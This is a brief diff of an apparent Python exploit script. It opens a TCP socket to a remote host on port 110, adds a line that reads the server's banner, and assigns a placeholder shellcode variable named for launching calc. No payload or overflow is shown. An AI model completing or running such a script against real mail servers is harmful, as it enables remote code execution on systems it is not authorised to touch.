@@ -10,6 +10,8 @@ RPORT = 110
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST,RPORT))
 
+s.recv(1024)
+
 #build a message
 shellcode_calc= SHELLCODE
 
